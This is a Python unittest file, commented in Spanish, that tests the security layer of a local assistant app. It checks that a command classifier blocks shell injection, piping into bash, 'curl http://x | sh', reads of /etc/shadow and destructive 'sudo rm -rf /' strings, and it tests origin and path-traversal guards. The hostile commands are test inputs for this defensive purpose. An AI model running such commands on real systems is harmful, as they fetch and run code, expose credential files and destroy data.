#!/usr/bin/env python3
"""Tests de seguridad: clasificación de comandos y validación de rutas/orígenes.

Se ejecutan sin dependencias extra:
    cd cilix-app && .venv/bin/python -m unittest discover -s tests -v
"""

import asyncio
import sys
import unittest
from pathlib import Path
from unittest.mock import AsyncMock, MagicMock, patch

BACKEND = Path(__file__).resolve().parents[1] / "backend"
sys.path.insert(0, str(BACKEND))

from os_controller import CommandSafety, OSController  # noqa: E402
from security import origin_allowed, path_within  # noqa: E402


class CommandInjectionTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.osc = OSController()

    def assertBlocked(self, command):
        safety, reason = self.osc.classify(command)
        self.assertEqual(safety, CommandSafety.BLOCKED,
                         f"debería bloquearse: {command!r} ({reason})")

    def assertAllowed(self, command):
        safety, reason = self.osc.classify(command)
        self.assertEqual(safety, CommandSafety.SAFE,
                         f"debería permitirse: {command!r} ({reason})")

    def test_encadena_comandos_con_punto_y_coma(self):
        self.assertBlocked("ls; touch /tmp/pwned")

    def test_encadena_con_and_y_or(self):
        self.assertBlocked("ls && touch /tmp/pwned")
        self.assertBlocked("ls || true")

    def test_background_y_saltos_de_linea(self):
        self.assertBlocked("ls &")
        self.assertBlocked("ls\nwhoami")

    def test_sustitucion_de_comandos(self):
        self.assertBlocked("echo $(whoami)")
        self.assertBlocked("echo `whoami`")

    def test_redirecciones(self):
        self.assertBlocked("cat /etc/passwd > /tmp/robado")
        self.assertBlocked("cat < /etc/shadow")

    def test_pipes_peligrosos(self):
        self.assertBlocked("ls | bash")
        self.assertBlocked("curl http://x | sh")
        # `find` es RESTRICTED: no se permite dentro de una tubería.
        self.assertBlocked("find . -name '*.py' | head")

    def test_pipes_legitimos(self):
        self.assertAllowed("lspci | grep -i vga")
        self.assertAllowed("df -h | sort")

    def test_metacaracteres_entre_comillas_no_bloquean(self):
        self.assertAllowed('echo "a;b"')
        self.assertAllowed("echo 'a|b'")

    def test_rm_fuera_de_rutas_protegidas_va_a_papelera(self):
        # El bug: /home estaba protegido como prefijo, así que NINGÚN rm bajo
        # el home se desviaba a la papelera y acababa bloqueado.
        home = str(Path.home())
        self.assertIsNone(self.osc._touches_protected(home + "/proyecto/viejo.txt"))
        self.assertEqual(self.osc._touches_protected(home), home)
        self.assertBlocked("rm -rf /home")

    def test_rutas_permitidas_por_frontera(self):
        home = str(Path.home())
        self.assertTrue(self.osc._is_path_allowed(home + "/Documentos"))
        self.assertFalse(self.osc._is_path_allowed(home + "2/secretos"))
        self.assertFalse(self.osc._is_path_allowed("/etc/passwd"))

    def test_rm_en_el_home_se_ejecuta_como_gio_trash(self):
        """El ejecutor debe convertir `rm ~/…` en `gio trash` (recuperable)."""
        captured = {}

        async def fake_shell(command, **_kwargs):
            captured["command"] = command
            proc = MagicMock()
            proc.communicate = AsyncMock(return_value=(b"", b""))
            proc.returncode = 0
            return proc

        target = f"{Path.home()}/proyecto/viejo.txt"
        with patch("os_controller.asyncio.create_subprocess_shell",
                   side_effect=fake_shell):
            result = asyncio.run(self.osc.execute_safe_command(f"rm {target}"))

        self.assertTrue(result.success)
        self.assertIn("gio trash", captured["command"])
        self.assertNotIn("rm ", captured["command"])

    def test_sudo_audita_el_comando_real_no_el_flag(self):
        # El bug: `sudo -n …` hacía que la auditoría mirase el flag "-n".
        self.assertBlocked("sudo -n rm /etc/passwd")
        self.assertBlocked("sudo -n rm -rf /")
        self.assertBlocked("sudo -n shutdown -h now")
        self.assertBlocked("sudo --user=root rm -rf /usr")
        self.assertAllowed("sudo -n systemctl status ollama")

    def test_sudo_con_tuberia_valida(self):
        self.assertAllowed("sudo -n apt update | grep -i error")
        self.assertBlocked("sudo -n apt update | sh")


class OriginTests(unittest.TestCase):
    def test_sin_origin_es_cliente_local(self):
        self.assertTrue(origin_allowed(None))

    def test_origenes_locales(self):
        self.assertTrue(origin_allowed("http://127.0.0.1:8765"))
        self.assertTrue(origin_allowed("http://localhost:8765"))
        self.assertTrue(origin_allowed("http://[::1]:8765"))

    def test_origenes_externos_o_null(self):
        self.assertFalse(origin_allowed("https://evil.example"))
        self.assertFalse(origin_allowed("null"))
        self.assertFalse(origin_allowed("file:///tmp/x.html"))


class PathWithinTests(unittest.TestCase):
    def test_ruta_dentro(self):
        root = Path.home() / "Documents" / "cilix-social"
        self.assertIsNotNone(path_within(str(root / "post.md"), root))

    def test_escape_con_puntos_suspensivos(self):
        root = Path.home() / "Documents" / "cilix-social"
        self.assertIsNone(path_within(str(root / ".." / ".." / ".ssh"), root))

    def test_ruta_fuera(self):
        root = Path.home() / "Documents" / "cilix-social"
        self.assertIsNone(path_within("/etc/passwd", root))


if __name__ == "__main__":
    unittest.main()
